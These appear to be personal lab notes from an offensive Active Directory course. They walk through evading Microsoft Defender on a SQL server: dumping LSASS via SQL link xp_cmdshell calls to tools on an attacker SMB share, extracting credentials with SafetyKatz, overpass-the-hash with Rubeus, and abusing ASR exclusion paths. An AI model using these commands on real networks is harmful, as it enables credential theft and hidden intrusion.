MDE is enabled for eu-sql in the lab
- to access, log into https://security.microsoft.com and login with student credentials
- goal is to do the following while remaining undetected
	- SQL command execution through SQL server links
	- Tool transfer
	- Credential extraction
	- Data exfiltration
	- Lateral movement / remote access


# Credential Extraction

LSASS dump using custom APIs
- [MiniDumpDotNet](https://github.com/WhiteOakSecurity/MiniDumpDotNet)
	- implements a custom rewritten implementation of MiniDumpWriteDump Windows API function
`./minidumpdotnet.exe <LSASS PID> <minidump file>`
- to get the PID of LSASS, you must use WINAPIs or it will get picked up
	- if you have RDP access, you can use Task Manager or other unsuspicious tools
- can use a code snippet like the following to get a PID
![[assets/Pasted image 20260321041846.png]]
- using this code in an executable by itself will not trigger Defender AV or MDE


# Tool Transfer and Execution

- if binaries that are intended for downloads (such as MS Edge), then you can download without detections
- however, SMB will always be the best since you can directly perform the execution and directly write the dump back to a share
- **bypassing correlation-based detections**
	- wait for a small interval (~10 min) between queries
	- append non-suspicious queries in between suspicious ones
		- i.e. running simple SQL queries



# Reversing ASR Rules

[GitHub](https://github.com/HackingLZ/ExtractedDefender/blob/main/asr/d1e49aac-8f56-4280-b9ba-993a6d77406c)



# Avoiding ASR rules

- to avoid detections based on specific ASR rules such as "Block process creations originating from PSExec and WMI commands", you can
	- use alternatives such as winrs (detected by MDE but not MDI)
	- use GetCommandLineExclusions function, which displays a list of exclusions
		- For example, "..\\\\windows\\\\ccm\\\\systemtemp\\\\.+"
`C:\AD\Tools\WSManWinRM.exe eu-sql.eu.eurocorp.local "cmd /c notepad.exe C:\Windows\ccm\systemtemp\"`
- since ccm\\systemtemp is in the exclusions, it will not trigger a detection if you put it at the end



# Learning Objective

### Compromise eu-sqlx again. Use opsec friendly alternatives to bypass MDE and MDI

Create an SMB share and give everyone read write access
- enable guest access
- right click folder to share -> properties -> sharing -> share -> Everyone
![[assets/Pasted image 20260321043059.png]]
- share contains FindLSASSPID and minidumpdotnet


Import PowerUpSQL
`Import-Module C:\AD\Tools\PowerUPSQL-master\PowerUpSQL.psd1`


share the file using the sql database links
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\FindLSASSPID.exe''' -QueryTarget eu-sqli`
![[assets/Pasted image 20260321043324.png]]
- won't download to machine, just runs it directly from the share


break the detection chain by running a simple command
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sql1`


dump the memory of the LSASS process
`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\minidumpdotnet.exe 696 \\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\monkey1.dmp''' -QueryTarget eu-sql1`
- will take 5-6 minutes


use SafetyKatz to extract credentials from the dump
`C:\AD\Tools\safetykatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare1\monkey1.dmp "sekurlsa::evasive-keys" "exit"`
![[assets/Pasted image 20260321044035.png]]


overpass the hash with the credentials extracted
`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:<hash> /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocrop.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
- if MDI blocks this one, try the custom tool WSManWinRM
`C:\AD\Tools\WSManWinRM.exe eu-sql1.eu.eurocorp.local "cmd /c set username C:\Windows\ccmcache\"`
- if this one is blocked too, try winrs
`winrs -r:eu-sql1.eu.eurocrop.local cmd`
`set username`
![[assets/Pasted image 20260321044456.png]]
- remember you don't need to privesc every machine, just get remote code execution

